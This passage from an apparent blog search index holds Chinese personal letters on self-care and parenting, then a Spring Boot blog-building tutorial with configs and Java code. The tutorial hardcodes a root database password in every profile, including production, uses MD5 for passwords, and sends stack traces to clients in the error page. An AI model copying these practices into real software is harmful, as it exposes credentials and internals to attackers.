，什么感觉。\n就这么简单。\n开始对自己诚实，\n开始从可以为自己做的一件很小很小的事情，\n开始触摸自己的身体，\n开始和自己对话，\n开始，开始，开始。\n用你的双手，堵上耳朵，关掉所有周围对你的评价的声音。\n慢慢了解自己，慢慢自己评价自己，慢慢问自己对一切的认知。\n你在你的世界，你就是王，你就是你自己的标准，唯一的标准。\n用你的双手，蒙上眼睛，闭上眼睛，用心里的眼睛去看，去感觉。\n信任心里的这双眼睛，信任内心的感觉。\n开心的时候，允许自己开心。\n伤心的时候，允许自己哭泣。\n不安的时候，允许自己恐惧。\n感觉，感觉，再感觉。\n如同闻到鲜花的芬芳，如同看见日出日落，如同听见鸟儿欢唱，\n如同尝到香甜的美味，如同触摸自己的肌肤，如同环抱自己的膝盖。\n你所能感觉到的一切，都值得信任。\n用你的双手，触摸自己的胸口、小腹身体的任何部位，\n你能感受到的掌心的温度，\n就是身体给你的爱，就是你给自己的爱。\n爱自己，就那么简单。\n在你感觉冷的时候，感觉孤单无助的时候，感觉紧张兴奋的时候，\n任何时候，通过双手，碰触身体任何部位，\n这便是身体与心的连接。\n这便是宇宙与你的连接。\n掌心的温度，便是你的爱，宇宙的支持。\n如果手很冷，就搓搓，摩擦生热：）\n最后，还有一点，无论你现在在哪里，要去哪里，\n走下去，走下去，走下去。\n无论停下来多久，记得，继续走下去。\n无论是黑暗或者阴暗，记得，起来，继续走下去。\n你要的一切，\n你困惑的一切，\n你未知的一切，\n要走下去，要动起来，要行动，\n才会真正发生。\n不要害怕，不要怀疑，不要放弃。\n因为在这不同的路，相同的道，\n你，并不独孤。\n我在，\n我们，在一起。\n还有，从未离开和消失的，源头。\n\n我只是在呢喃自语，\n如果你看了，就已经是一种见证和陪伴了，\n因为我知道一定会有人看。\n如果有什么信息能和你共鸣，\n你从中看见了自己，\n那就是另外的收获了。\n如果你看懂了，\n你从中看见了我，\n还能有什么回应，\n并且这回应我们还可以彼此共振，\n那就是更大的惊喜了。\n没有无缘无故的遇见。\n致敬未知。\n","slug":"epistle.2021.9.1.01","date":"2021-08-31T18:13:56.000Z","categories_index":"书信","tags_index":"小柔书信","author_index":"Arvin"},{"id":"8bf83a852d6dc1d4e160d4f9a6bb015d","title":"【無憂樹洞】陪伴","content":"亲爱的，今天你过的好吗？\n大部分时候，给你写信，还是自言自语的更多，不像是在跟你说话，尽管我总是让信件看起来仿佛在与你对话。\n然后我觉得，与你对话，仿佛自言自语，是一种敞开与坦诚。而，这的确不是一场对话。从你收到我的第一封信开始，你就知道这一点了吧。不过我的头脑，也始终会有一个问题，在关系中，我们是否需要对话？虽然所有的对话也只是不同形式的自言自语，因为我们只会看见投射，不会看见真实的彼此。放开头脑的问题，心是自由的，心是没有问题的，心只会做祂想要做的，心更注重内心的感觉。\n我最近有打坐，今天开始还起早打坐了，因为白天太忙了，没有足够的时间。我的头脑也会犹豫和纠结，我究竟是要按照师傅的功法继续练，还是要放弃。因为我能感觉到身体不喜欢那个刻意的意守丹田，身体更喜欢自然的，体内气血自然的流动。我也不知道，我是该给气血一些规矩，道路，去刻意的引导气的流动，还是应该让他们顺其自然。我知道这只是方式的不同，其实无论哪个方式，心无挂碍的去做就行，我这不就是心有挂碍，不知道该如何，我要再想想，再感觉感觉。\n今天还和孩子发脾气了，我很少发脾气，也很少大声吼他，也很少说教他。不过今天早上吼了他一次，晚上又巴拉巴拉说了一些。我看见我自己的担心，担心他不学无术，每天玩游戏刷抖音以后越来越差，不仅仅是成绩差，学习态度也随便，还懒…总之也没什么好习惯，我自己是很不讲究这些规矩的，但是起码我勤奋，态度端正，该做的事情一定是靠谱的做。我也会纠结和顾虑关于孩子的教育，究竟什么要管，什么可以不管，这个尺度何止智慧两个字。但是我看到更深的担心是，我害怕和担心被别人说，被别人评价我这样为人妈是不行的，是不可以的，是不好的。如果没有人会评价我，父母，前夫，闺蜜，甚至不相关的人，如果没有评价的标准，可能我真的什么都不会做。而未来孩子也会长大，社会系统还是有评价，顺带评价孩子他妈。嗯，我就是很不愿意被人说当妈的不行，哈~这个部分还很值得深入的挖挖。我一直觉得，教育不过是先把自己过好了。一个生命影响另一个生命，那是极其自然的事情。还是能感觉到这个部分，我还是有很多很深的情绪的呀\n今天看到国外的一个疫情的新闻报道，说的是陪伴犬的故事。人这种动物是需要被触摸，被拥抱，需要肌肤接触，需要无条件的爱与接纳，需要被抱持。有时候觉得宠物陪伴的很大能量是，它们不会说话，没有言语的消耗。语言就是一种能量武器呢，哈哈。而且人的场比动物的场更复杂。你一定遇到过一些人，你待在他身边，不说话，都觉得很舒服。反之，也有一些人，靠近就不舒服。\n谢谢你这段日子的陪伴。\n无论你是不是给我写过信，这份陪伴的场和能量也是在的。好吧，你也要谢谢我吗？我收到你的谢谢了。\n深入自己是很难的。经过这段时间，我想我已经准备好，自己一个人去走更深的路了。我打算花更多的时间，深入自己，解剖自己。而这个过程可能真的更自我，更自言自语。谢谢你陪我走到了这里。下面的路，只能我自己去走。\n我的豆瓣会不定期更新，如果你对我的自言自语依然有兴趣。\n我也会继续给你写信，跟你道晚安，像熟悉的老朋友那样问候你，告诉你我的近况，我眼里的世界，以及新奇的故事。只不过，会从每天，调整为不定期。\n相信你会更多的祝福我，因为这表示，我终于准备好，自己一个人，去走更深的路，也表示我成长了，而且还会不断的持续的成长。\n晚安，亲爱的，这是我第45天跟你道晚安。\n\n我只是在呢喃自语，\n如果你看了，就已经是一种见证和陪伴了，\n因为我知道一定会有人看。\n如果有什么信息能和你共鸣，\n你从中看见了自己，\n那就是另外的收获了。\n如果你看懂了，\n你从中看见了我，\n还能有什么回应，\n并且这回应我们还可以彼此共振，\n那就是更大的惊喜了。\n没有无缘无故的遇见。\n致敬未知。\n","slug":"epistle.2021.8.31.03","date":"2021-08-30T16:50:58.000Z","categories_index":"书信","tags_index":"小柔书信","author_index":"Arvin"},{"id":"bd3f2a23e25dff5e0d336cdb528e9426","title":"【無憂樹洞】幸福的感觉","content":"嗨，你今天过的好吗？\n你在什么时候，会有幸福的感觉？\n晒太阳，好幸福。哈哈。\n忍不住想要跟你分享这样的幸福。\n躺在瑜伽垫上，趴着，露着脚丫子，一定要光脚呢，太阳可以晒到整个身体。一会儿还可以翻身，仰面朝天，用衣服盖住眼睛。\n太阳晒在身上，热热的感觉，就像水波一样，一阵一阵的，难怪会有一个词叫做热浪。\n感受太阳的能量，感受太阳的温热进入身体，是一阵一阵的能量，特别舒服 。\n这真是一种特别简单的幸福，好像一瞬间就变成了一棵树，或者一朵花，也没有任何的思考，只是存在。\n最近这一周的学习，信息量很大，还需要花很多时间消化和练习。\n忙碌的时候，感觉时间过得更快。\n希望你一切都好。\n晚安，亲爱的，这是我第26天跟你道晚安\n\n我只是在呢喃自语，\n如果你看了，就已经是一种见证和陪伴了，\n因为我知道一定会有人看。\n如果有什么信息能和你共鸣，\n你从中看见了自己，\n那就是另外的收获了。\n如果你看懂了，\n你从中看见了我，\n还能有什么回应，\n并且这回应我们还可以彼此共振，\n那就是更大的惊喜了。\n没有无缘无故的遇见。\n致敬未知。\n","slug":"epistle.2021.8.31.02","date":"2021-08-30T16:33:56.000Z","categories_index":"书信","tags_index":"小柔书信","author_index":"Arvin"},{"id":"e282a6887ea4ee7f400b573a3573e955","title":"【無憂樹洞】晚安","content":"听课有点累了。\n我准备睡觉了。\n希望你今天过得好。\n还是要跟你说晚安。祝你今夜无梦。\n这是我第27天跟你道晚安。\n\n我只是在呢喃自语，\n如果你看了，就已经是一种见证和陪伴了，\n因为我知道一定会有人看。\n如果有什么信息能和你共鸣，\n你从中看见了自己，\n那就是另外的收获了。\n如果你看懂了，\n你从中看见了我，\n还能有什么回应，\n并且这回应我们还可以彼此共振，\n那就是更大的惊喜了。\n没有无缘无故的遇见。\n致敬未知。\n","slug":"epistle.2021.8.31.01","date":"2021-08-30T16:19:38.000Z","categories_index":"书信","tags_index":"小柔书信","author_index":"Arvin"},{"id":"216669ccbaf7065ae0dc9095bebf12e8","title":"基于Spring-Boot的博客开发系统","content":"基于Spring Boot网站架构参考文件说明：\n\n\n\n文件名称\n文件说明\n\n\n\npom.xml\n项目配置文件\n\n\nin.md\n开发参考说明文档\n\n\napplication.yml\nSpringBoot开发环境配置文件(公共环境下配置)\n\n\napplication-pro.yml\nSpringBoot开发环境配置文件(生产环境下配置)\n\n\napplication-dev.yml\nSpringBoot开发环境配置文件(开发环境下配置)\n\n\nlogback-spring.xml\n日志模块配置文件\n\n\n404.html\n404错误页面\n\n\n505.html\n505错误页面\n\n\nerror.html\nBeBug页面\n\n\nblogs.html\n后台管理页面\n\n\nblogs-input.html\n博客后台发布页面\n\n\ntype.html\n后台分类管理页面\n\n\ntype-input.html\n后台分类新增页面\n\n\nabout.html\n关于我页面\n\n\narchives.html\n归档页面\n\n\nblog.html\n博客详情页面\n\n\nindex.html\n博客首页\n\n\ntags.html\n标签页面\n\n\ntype.html\n分类页面\n\n\nlogin.html\n登录页面\n\n\nsearch.html\n搜索页面\n\n\n_fragments.html\n动态页面 定义Thymeleaf片段\n\n\nIndexController.java\nWeb控制器\n\n\nLoginController.java\nWEB登录模块控制器\n\n\nBlogController.java\nBlog后台页面权限过滤管理类\n\n\nTypeController.java\nWeb层分类模块操作\n\n\nTagController.java\nWeb层标签模块操作\n\n\nCommentController.java\n评论模块处理\n\n\nTypeShowController.java\n分类模块处理\n\n\nTagShowController.java\n标签模块处理\n\n\nArchiveShowController.java\n归档模块处理\n\n\nAboutShowController.java\n个人模块处理\n\n\nLongInterceptor.java\nBlog后台页面权限(登录过滤)类\n\n\nWebConfig.html\nBlog后台页面权限(拦截配置) 类\n\n\nControllerExceptionHandler.java\nBeBug拦截器\n\n\nNotFoundException.java\n异常类，业务相关（如果没有页面报错404）\n\n\nBlog.java\nBlog实体类\n\n\nType.java\n分类实体类\n\n\nTag.java\n标签实体类\n\n\nComment.java\n评论实体类\n\n\nUser.java\n用户实体类\n\n\nUserService.java\nUser登录业务逻辑处理接口类\n\n\nUserServiceImpl.java\nUser登录业务逻辑处理实现类\n\n\nTypeService.java\n分类业务逻辑处理接口\n\n\nTypeServiceImpl.java\n分类业务逻辑处理实现类\n\n\nTagService.java\n标签业务逻辑处理接口\n\n\nBlogService.java\n博客业务逻辑处理接口\n\n\nBlogServiceImpl.java\n博客业务逻辑处理实现类\n\n\nTagServiceImpl.java\n标签业务逻辑处理实现类\n\n\nCommentService.java\n评论业务逻辑处理接口\n\n\nCommentServiceImpl.java\n评论业务逻辑处理实现类\n\n\nUserRepository.java\n引用SpringJPA SQL操作接口\n\n\nTypeRepository.java\n分类业务处理 SQL操作接口\n\n\nTagRepository.java\n标签业务处理 SQL操作接口\n\n\nBlogRepository.java\n博客业务处理 SQL操作接口\n\n\nCommentRepository.java\n评论业务处理 SQL操作接口\n\n\nBlogQuery.java\n博客搜索查询类\n\n\nMD5Utils.java\nMD5加密类\n\n\nMyBeanUtils.java\n修复SQL数据修改后为null工具类(过滤掉数据值为null)\n\n\nMarkdownUtils.java\nMarkdown转换HTML工具类\n\n\nmessages.properties\n数据配置文件\n\n\n项目配置(Jar包)\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;\n         xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 https:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt;\n    &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt;\n\n    &lt;parent&gt;\n        &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n        &lt;artifactId&gt;spring-boot-starter-parent&lt;&#x2F;artifactId&gt;\n        &lt;version&gt;2.4.2&lt;&#x2F;version&gt;\n        &lt;relativePath&#x2F;&gt; &lt;!-- lookup parent from repository --&gt;\n    &lt;&#x2F;parent&gt;\n\n    &lt;groupId&gt;com.cxkj&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;blog&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;0.0.1-SNAPSHOT&lt;&#x2F;version&gt;\n    &lt;name&gt;blog&lt;&#x2F;name&gt;\n    &lt;description&gt;Demo project for Spring Boot&lt;&#x2F;description&gt;\n\n    &lt;properties&gt;\n        &lt;java.version&gt;1.8&lt;&#x2F;java.version&gt;\n        &lt;tymeleaf.version&gt;3.0.2.RELEASE&lt;&#x2F;tymeleaf.version&gt;\n        &lt;tymeleaf-layout-dialect.version&gt;2.1.1&lt;&#x2F;tymeleaf-layout-dialect.version&gt;\n    &lt;&#x2F;properties&gt;\n\n    &lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-aop&lt;&#x2F;artifactId&gt;\n        &lt;&#x2F;dependency&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;&#x2F;artifactId&gt;\n        &lt;&#x2F;dependency&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;&#x2F;artifactId&gt;\n        &lt;&#x2F;dependency&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-web&lt;&#x2F;artifactId&gt;\n        &lt;&#x2F;dependency&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n            &lt;artifactId&gt;spring-boot-devtools&lt;&#x2F;artifactId&gt;\n            &lt;scope&gt;runtime&lt;&#x2F;scope&gt;\n            &lt;optional&gt;true&lt;&#x2F;optional&gt;\n        &lt;&#x2F;dependency&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt;\n            &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt;\n            &lt;scope&gt;runtime&lt;&#x2F;scope&gt;\n        &lt;&#x2F;dependency&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-test&lt;&#x2F;artifactId&gt;\n            &lt;scope&gt;test&lt;&#x2F;scope&gt;\n        &lt;&#x2F;dependency&gt;\n    &lt;&#x2F;dependencies&gt;\n\n    &lt;build&gt;\n        &lt;plugins&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n                &lt;artifactId&gt;spring-boot-maven-plugin&lt;&#x2F;artifactId&gt;\n            &lt;&#x2F;plugin&gt;\n        &lt;&#x2F;plugins&gt;\n    &lt;&#x2F;build&gt;\n\n&lt;&#x2F;project&gt;\n后面导入的Jar包(新版本原因曾经的Jar不包含了)\n&lt;dependency&gt;\n    &lt;groupId&gt;javax.validation&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;validation-api&lt;&#x2F;artifactId&gt;\n&lt;&#x2F;dependency&gt;\n\n&lt;dependency&gt;\n    &lt;groupId&gt;org.hibernate&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;hibernate-validator&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;6.0.13.Final&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\nMarkdown转换HTML第三方Jar包配置\n&lt;dependency&gt;\n    &lt;groupId&gt;com.atlassian.commonmark&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;commonmark&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;0.10.0&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n\n&lt;dependency&gt;\n    &lt;groupId&gt;com.atlassian.commonmark&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;commonmark-ext-heading-anchor&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;0.10.0&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n\n&lt;dependency&gt;\n    &lt;groupId&gt;com.atlassian.commonmark&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;commonmark-ext-gfm-tables&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;0.10.0&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\nApplication.yml配置文件thymeleaf模板配置\nspring:\n  thymeleaf: \n    mode: HTML\n数据库相关连接配置\ndatasource:\n  driver-class-name: com.mysql.cj.jdbc.Driver\n  url: jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;blog?useSSL&#x3D;false&amp;useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf-8\n  username: root\n  password: 123456789\nJPA的连接配置\njpa:\nhibernate:\n  ddl-auto: update\nshow-sql: true\n日志配置\nlogging:\n  level:\n    root: info\n    com.cxkj: debug\n  file:\n    name: log&#x2F;blog.log\n日志的细节操作(logback-spring.xml)\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;\n&lt;configuration&gt;\n    &lt;!--包含Spring boot对logback日志的默认配置--&gt;\n    &lt;include resource&#x3D;&quot;org&#x2F;springframework&#x2F;boot&#x2F;logging&#x2F;logback&#x2F;defaults.xml&quot; &#x2F;&gt;\n    &lt;property name&#x3D;&quot;LOG_FILE&quot; value&#x3D;&quot;$&#123;LOG_FILE:-$&#123;LOG_PATH:-$&#123;LOG_TEMP:-$&#123;java.io.tmpdir:-&#x2F;tmp&#125;&#125;&#125;&#x2F;spring.log&#125;&quot;&#x2F;&gt;\n    &lt;include resource&#x3D;&quot;org&#x2F;springframework&#x2F;boot&#x2F;logging&#x2F;logback&#x2F;console-appender.xml&quot; &#x2F;&gt;\n\n    &lt;!--重写了Spring Boot框架 org&#x2F;springframework&#x2F;boot&#x2F;logging&#x2F;logback&#x2F;file-appender.xml 配置--&gt;\n    &lt;appender name&#x3D;&quot;TIME_FILE&quot;\n              class&#x3D;&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;\n        &lt;encoder&gt;\n            &lt;pattern&gt;$&#123;FILE_LOG_PATTERN&#125;&lt;&#x2F;pattern&gt;\n        &lt;&#x2F;encoder&gt;\n        &lt;file&gt;$&#123;LOG_FILE&#125;&lt;&#x2F;file&gt;\n        &lt;rollingPolicy class&#x3D;&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;\n            &lt;fileNamePattern&gt;$&#123;LOG_FILE&#125;.%d&#123;yyyy-MM-dd&#125;.%i&lt;&#x2F;fileNamePattern&gt;\n            &lt;!--保留历史日志一个月的时间--&gt;\n            &lt;maxHistory&gt;30&lt;&#x2F;maxHistory&gt;\n            &lt;!--\n            Spring Boot默认情况下，日志文件10M时，会切分日志文件,这样设置日志文件会在100M时切分日志\n            --&gt;\n            &lt;timeBasedFileNamingAndTriggeringPolicy class&#x3D;&quot;ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP&quot;&gt;\n                &lt;maxFileSize&gt;10MB&lt;&#x2F;maxFileSize&gt;\n            &lt;&#x2F;timeBasedFileNamingAndTriggeringPolicy&gt;\n\n        &lt;&#x2F;rollingPolicy&gt;\n    &lt;&#x2F;appender&gt;\n\n    &lt;root level&#x3D;&quot;INFO&quot;&gt;\n        &lt;appender-ref ref&#x3D;&quot;CONSOLE&quot; &#x2F;&gt;\n        &lt;appender-ref ref&#x3D;&quot;TIME_FILE&quot; &#x2F;&gt;\n    &lt;&#x2F;root&gt;\n\n&lt;&#x2F;configuration&gt;\n        &lt;!--\n            1、继承Spring boot logback设置（可以在appliaction.yml或者application.properties设置logging.*属性）\n            2、重写了默认配置，设置日志文件大小在100MB时，按日期切分日志，切分后目录：\n\n                blog.2017-08-01.0   80MB\n                blog.2017-08-01.1   10MB\n                blog.2017-08-02.0   56MB\n                blog.2017-08-03.0   53MB\n                ......\n        --&gt;\n公共环境(开发环境指定为dev)\nspring:\n  thymeleaf:\n    mode: HTML\n  profiles:\n    active: dev\n开发环境\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;blog?useSSL&#x3D;false&amp;useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf-8\n    username: root\n    password: 123456789\n\n  jpa:\n    hibernate:\n      ddl-auto: update\n    show-sql: true\n\nlogging:\n  level:\n    root: info\n    com.cxkj: debug\n  file:\n    name: log&#x2F;blog-dev.log\n生产环境\nspring:\n  datasource:\n    driver-class-name: com.mysql.jdbc.Driver\n    url: jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;blog?useSSL&#x3D;false&amp;useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf-8\n    username: root\n    password: 123456789\n\n  jpa:\n    hibernate:\n      ddl-auto: none\n    show-sql: true\n\nlogging:\n  level:\n    root: warn\n    com.cxkj: info\n  file:\n    name: log&#x2F;blog-pro.log\n\nserver:\n  port: 808\n异常处理IndexController.java Web控制器\npackage com.cxkj.blog.web;\n\nimport com.cxkj.blog.NotFoundException;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;3.\n *&#x2F;\n@Controller\npublic class IndexController &#123;\n    @GetMapping(&quot;&#x2F;&quot;)\n    public String index()&#123;\n        String blog &#x3D; null;\n        if (blog &#x3D;&#x3D; null)&#123;\n            throw  new NotFoundException(&quot;博客不存在&quot;);\n        &#125;\n        return &quot;index&quot;;\n    &#125;\n\n&#125;\nControllerExceptionHandler.java BeBug拦截器\npackage com.cxkj.blog.handler;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.core.annotation.AnnotationUtils;\nimport org.springframework.web.bind.annotation.ControllerAdvice;\nimport org.springframework.web.bind.annotation.ExceptionHandler;\nimport org.springframework.web.bind.annotation.ResponseStatus;\nimport org.springframework.web.servlet.ModelAndView;\n\nimport javax.servlet.http.HttpServletRequest;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;3.\n *&#x2F;\n@ControllerAdvice\npublic class ControllerExceptionHandler &#123;\n    private final Logger logger &#x3D; LoggerFactory.getLogger(this.getClass());\n\n    @ExceptionHandler(Exception.class)\n    public ModelAndView exceptionHandler(HttpServletRequest request,Exception e) throws Exception &#123;\n        logger.error(&quot;Requst URL : &#123;&#125;,Exception : &#123;&#125;&quot;, request.getRequestURI(),e);\n\n        if (AnnotationUtils.findAnnotation(e.getClass(), ResponseStatus.class) !&#x3D; null)&#123;\n            throw e;\n        &#125;\n        ModelAndView mv &#x3D; new ModelAndView();\n        mv.addObject(&quot;url&quot;,request.getRequestURI());\n        mv.addObject(&quot;exception&quot;,e);\n        mv.setViewName(&quot;error&#x2F;error&quot;);\n        return mv;\n    &#125;\n&#125;\nerror.html BeBug页面\n&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;en&quot; xmlns:th&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;\n\n    &lt;head&gt;\n        &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n        &lt;title&gt;BeBug&lt;&#x2F;title&gt;\n    &lt;&#x2F;head&gt;\n\n    &lt;body&gt;\n        &lt;h1&gt;BeBug&lt;&#x2F;h1&gt;\n        &lt;div&gt;\n            &lt;div th:utext&#x3D;&quot;&#39;&lt;!--&#39;&quot; th:remove&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;div&gt;\n            &lt;div th:utext&#x3D;&quot;&#39;Failed Request URL : &#39; + $&#123;url&#125;&quot; th:remove&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;div&gt;\n            &lt;div th:utext&#x3D;&quot;&#39;Exception message : &#39; + $&#123;exception.message&#125;&quot; th:remove&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;div&gt;\n            &lt;ul th:remove&#x3D;&quot;tag&quot;&gt;\n                &lt;li th:each&#x3D;&quot;st : $&#123;exception.stackTrace&#125;&quot; th:remove&#x3D;&quot;tag&quot;&gt;&lt;span th:utext&#x3D;&quot;$&#123;st&#125;&quot; th:remove&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;li&gt;\n            &lt;&#x2F;ul&gt;\n            &lt;div th:utext&#x3D;&quot;&#39;--&gt;&#39;&quot; th:remove&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;div&gt;\n        &lt;&#x2F;div&gt;\n    &lt;&#x2F;body&gt;\n\n&lt;&#x2F;html&gt;\nNotFoundException.java 异常类，业务相关（如果没有页面报错404）\npackage com.cxkj.blog;\n\nimport org.springframework.http.HttpStatus;\nimport org.springframework.web.bind.annotation.ResponseStatus;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;3.\n *&#x2F;\n@ResponseStatus(HttpStatus.NOT_FOUND)\npublic class NotFoundException extends RuntimeException&#123;\n    public NotFoundException() &#123;\n    &#125;\n\n    public NotFoundException(String message) &#123;\n        super(message);\n    &#125;\n\n    public NotFoundException(String message, Throwable cause) &#123;\n        super(message, cause);\n    &#125;\n&#125;\n\n日志处理LogAspect.java 接口记录日志AOP类\npackage com.cxkj.blog.aspect;\n\nimport org.aspectj.lang.JoinPoint;\nimport org.aspectj.lang.annotation.*;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.context.request.RequestContextHolder;\nimport org.springframework.web.context.request.ServletRequestAttributes;\n\nimport javax.servlet.http.HttpServletRequest;\nimport java.util.Arrays;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;4.\n *&#x2F;\n@Aspect\n@Component\npublic class LogAspect &#123;\n\n    private final Logger logger &#x3D; LoggerFactory.getLogger(this.getClass());\n\n    @Pointcut(&quot;execution(* com.cxkj.blog.web.*.*(..))&quot;)\n    public void log() &#123;\n    &#125;\n\n    @Before(&quot;log()&quot;)\n    public void doBefore(JoinPoint joinPoint) &#123;\n        ServletRequestAttributes attributes &#x3D; (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();\n        HttpServletRequest request &#x3D; attributes.getRequest();\n        String url &#x3D; request.getRequestURL().toString();\n        String ip &#x3D; request.getRemoteAddr();\n        String classMethod &#x3D; joinPoint.getSignature().getDeclaringTypeName() + &quot;.&quot; + joinPoint.getSignature().getName();\n        Object[] args &#x3D; joinPoint.getArgs();\n        RequestLog requestLog &#x3D; new RequestLog(url, ip, classMethod, args);\n        logger.info(&quot;Request : &#123;&#125;&quot;, requestLog);\n    &#125;\n\n    @After(&quot;log()&quot;)\n    public void doAfter() &#123;\n        &#x2F;&#x2F;logger.info(&quot;------ doAfter ------&quot;);\n    &#125;\n\n    @AfterReturning(returning &#x3D; &quot;result&quot;, pointcut &#x3D; &quot;log()&quot;)\n    public void doAfterReturning(Object result) &#123;\n        logger.info(&quot;Result : &#123;&#125;&quot; + result);\n    &#125;\n\n    private class RequestLog &#123;\n        private final String url;\n        private final String ip;\n        private final String classMethod;\n        private final Object[] args;\n\n        public RequestLog(String url, String ip, String classMethod, Object[] args) &#123;\n            this.url &#x3D; url;\n            this.ip &#x3D; ip;\n            this.classMethod &#x3D; classMethod;\n            this.args &#x3D; args;\n        &#125;\n\n        @Override\n        public String toString() &#123;\n            return &quot;&#123;&quot; +\n                    &quot;url&#x3D;&#39;&quot; + url + &#39;\\&#39;&#39; +\n                    &quot;, ip&#x3D;&#39;&quot; + ip + &#39;\\&#39;&#39; +\n                    &quot;, classMethod&#x3D;&#39;&quot; + classMethod + &#39;\\&#39;&#39; +\n                    &quot;, args&#x3D;&quot; + Arrays.toString(args) +\n                    &#39;&#125;&#39;;\n        &#125;\n    &#125;\n\n&#125;\nIndexController.java\npackage com.cxkj.blog.web;\n\nimport com.cxkj.blog.NotFoundException;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;3.\n *&#x2F;\n@Controller\npublic class IndexController &#123;\n    @GetMapping(&quot;&#x2F;&#123;id&#125;&#x2F;&#123;name&#125;&quot;)\n    public String index(@PathVariable Integer id,@PathVariable String name)&#123;\n            &#x2F;*String blog &#x3D; null;\n            if (blog &#x3D;&#x3D; null)&#123;\n                throw  new NotFoundException(&quot;博客不存在&quot;);\n            &#125;*&#x2F;\n        System.out.println(&quot;------ Index ------&quot;);\n        return &quot;index&quot;;\n    &#125;\n&#125;\n\n页面处理IndexController.java Web控制器\npackage com.cxkj.blog.web;\n\nimport com.cxkj.blog.NotFoundException;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;3.\n *&#x2F;\n@Controller\npublic class IndexController &#123;\n    @GetMapping(&quot;&#x2F;&quot;)\n    public String index()&#123;\n            &#x2F;*String blog &#x3D; null;\n            if (blog &#x3D;&#x3D; null)&#123;\n                throw  new NotFoundException(&quot;博客不存在&quot;);\n            &#125;*&#x2F;\n        return &quot;index&quot;;\n    